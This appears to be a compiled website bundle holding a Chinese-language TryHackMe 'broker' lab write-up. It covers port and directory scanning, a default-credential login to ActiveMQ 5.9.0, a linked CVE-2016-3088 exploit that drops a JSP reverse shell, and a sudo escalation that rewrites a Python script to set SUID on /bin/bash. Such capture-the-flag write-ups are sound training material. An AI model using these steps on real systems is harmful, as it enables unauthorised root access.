"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[7253],{15031:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>o,contentTitle:()=>s,default:()=>p,frontMatter:()=>r,metadata:()=>c,toc:()=>l});var i=n(74848),a=n(28453);const r={sidebar_position:136,tags:["Easy","Linux","SUDO"],title:"broker",description:"broker",sidebar_label:"broker",slug:"/tryhackme/136"},s="broker",c={id:"box/TryHackMe/136",title:"broker",description:"broker",source:"@site/docs/box/TryHackMe/136.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/136",permalink:"/docs/tryhackme/136",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"SUDO",permalink:"/docs/tags/sudo"}],version:"current",sidebarPosition:136,frontMatter:{sidebar_position:136,tags:["Easy","Linux","SUDO"],title:"broker",description:"broker",sidebar_label:"broker",slug:"/tryhackme/136"},sidebar:"boxSidebar",previous:{title:"VulnNet: dotpy",permalink:"/docs/tryhackme/135"},next:{title:"Biblioteca",permalink:"/docs/tryhackme/137"}},o={},l=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"8161",id:"8161",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"activemq",id:"activemq",level:3},{value:"activemq \u2014&gt; root",id:"activemq--root",level:3}];function m(e){const t={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,a.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(t.h1,{id:"broker",children:"broker"}),"\n",(0,i.jsx)(t.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-bash",children:"root@ip-10-10-166-251:~/broker# nmap -sTCV -p 22,1883,8161,37483 --min-rate 1000 10.10.28.5\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-10-04 04:22 BST\nNmap scan report for ip-10-10-28-5.eu-west-1.compute.internal (10.10.28.5)\nHost is up (0.00017s latency).\n\nPORT      STATE SERVICE    VERSION\n22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 4c:75:a0:7b:43:87:70:4f:70:16:d2:3c:c4:c5:a4:e9 (RSA)\n|   256 f4:62:b2:ad:f8:62:a0:91:2f:0a:0e:29:1a:db:70:e4 (ECDSA)\n|_  256 92:d2:87:7b:98:12:45:93:52:03:5e:9e:c7:18:71:d5 (EdDSA)\n1883/tcp  open  mqtt?\n|_mqtt-subscribe: TIMEOUT\n8161/tcp  open  http       Jetty 7.6.9.v20130131\n|_http-server-header: Jetty(7.6.9.v20130131)\n|_http-title: Apache ActiveMQ\n37483/tcp open  tcpwrapped\nMAC Address: 02:01:CF:A8:E3:7B (Unknown)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,i.jsx)(t.h2,{id:"8161",children:"8161"}),"\n",(0,i.jsx)(t.p,{children:"\u8fdb\u884c\u76ee\u5f55\u626b\u63cf"}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-bash",children:"root@ip-10-10-166-251:~/broker# gobuster dir -u http://10.10.28.5:8161/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x html,txt\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.28.5:8161/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Extensions:     html,txt\n[+] Timeout:        10s\n===============================================================\n2023/10/04 04:26:41 Starting gobuster\n===============================================================\n/index.html (Status: 200)\n/images (Status: 302)\n/admin (Status: 401)\n/api (Status: 302)\n/styles (Status: 302)\n"})}),"\n",(0,i.jsx)(t.p,{children:"\u6839\u636e\u626b\u63cf\u6211\u53d1\u73b0\u5176\u662f\u4e00\u4e2a Jetty \u7a0b\u5e8f, \u5f53\u6211\u8bbf\u95ee admin \u65f6\u5176\u8981\u6c42\u6211\u63d0\u4f9b\u5bc6\u7801, \u6240\u4ee5\u6211\u67e5\u627e\u4e86 Jetty \u7684\u9ed8\u8ba4\u8d26\u53f7"}),"\n",(0,i.jsx)(t.p,{children:(0,i.jsx)(t.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-162313.png",alt:"image-20240709162311706"})}),"\n",(0,i.jsx)(t.p,{children:"\u4f7f\u7528\u6b64\u53d1\u73b0\u53ef\u4ee5\u767b\u9646, \u5728\u767b\u9646\u4e4b\u540e\u89c2\u5bdf\u7f51\u9875\u663e\u793a\u5185\u5bb9, \u6211\u6ce8\u610f\u5230\u4e24\u4e2a\u4f4d\u7f6e:"}),"\n",(0,i.jsxs)(t.ul,{children:["\n",(0,i.jsx)(t.li,{children:"ActiveMQ"}),"\n",(0,i.jsx)(t.li,{children:"Broker : 5.9.0"}),"\n"]}),"\n",(0,i.jsx)(t.p,{children:(0,i.jsx)(t.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-162321.png",alt:"image-20240709162320357"})}),"\n",(0,i.jsxs)(t.p,{children:["\u63a5\u7740\u6211\u57fa\u4e8e\u6b64\u5f00\u59cb\u67e5\u627e EXP \u6700\u7ec8\u53d1\u73b0 ActiveMQ \u7684\u53ef\u5229\u7528\u7a0b\u5e8f ",(0,i.jsx)(t.a,{href:"https://github.com/cyberaguiar/CVE-2016-3088/tree/main",children:"GitHub - cyberaguiar/CVE-2016-3088: Apache ActiveMQ Remote Code Execution Exploit"})]}),"\n",(0,i.jsx)(t.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,i.jsx)(t.h3,{id:"activemq",children:"activemq"}),"\n",(0,i.jsx)(t.p,{children:"\u6267\u884c\u6211\u4eec\u4e0a\u9762\u7684 EXP , \u6700\u7ec8\u4f1a\u4e0a\u4f20\u4e00\u4e2a JSP \u7684\u53cd\u5411 Shell"}),"\n",(0,i.jsx)(t.p,{children:(0,i.jsx)(t.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-162338.png",alt:"image-20240709162337230"})}),"\n",(0,i.jsx)(t.p,{children:(0,i.jsx)(t.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-162345.png",alt:"image-20240709162344216"})}),"\n",(0,i.jsx)(t.h3,{id:"activemq--root",children:"activemq \u2014> root"}),"\n",(0,i.jsx)(t.p,{children:"\u63a5\u7740\u6211\u53d1\u73b0\u7528\u6237 activemq \u5b58\u5728 SUDO \u7279\u6743"}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-bash",children:'(remote) activemq@activemq:/opt/apache-activemq-5.9.0$ sudo -l\nMatching Defaults entries for activemq on activemq:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser activemq may run the following commands on activemq:\n    (root) NOPASSWD: /usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py\n(remote) activemq@activemq:/opt/apache-activemq-5.9.0$ ls -al subscribe.py\n-rw-rw-r-- 1 activemq activemq 768 Dec 25  2020 subscribe.py\n(remote) activemq@activemq:/opt/apache-activemq-5.9.0$ cat << EOF > subscribe.py\n> import os\n> os.system("chmod u+s /bin/bash")\n> EOF\n(remote) activemq@activemq:/opt/apache-activemq-5.9.0$ sudo  /usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py\n(remote) activemq@activemq:/opt/apache-activemq-5.9.0$ ls -al /bin/bash\n-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash\n(remote) activemq@activemq:/opt/apache-activemq-5.9.0$ /bin/bash -p\n(remote) root@activemq:/opt/apache-activemq-5.9.0# id\nuid=1000(activemq) gid=1000(activemq) euid=0(root) groups=1000(activemq)\n'})})]})}function p(e={}){const{wrapper:t}={...(0,a.R)(),...e.components};return t?(0,i.jsx)(t,{...e,children:(0,i.jsx)(m,{...e})}):m(e)}},28453:(e,t,n)=>{n.d(t,{R:()=>s,x:()=>c});var i=n(96540);const a={},r=i.createContext(a);function s(e){const t=i.useContext(r);return i.useMemo((function(){return"function"==typeof e?e(t):{...t,...e}}),[t,e])}function c(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:s(e.components),i.createElement(r.Provider,{value:t},e.children)}}}]);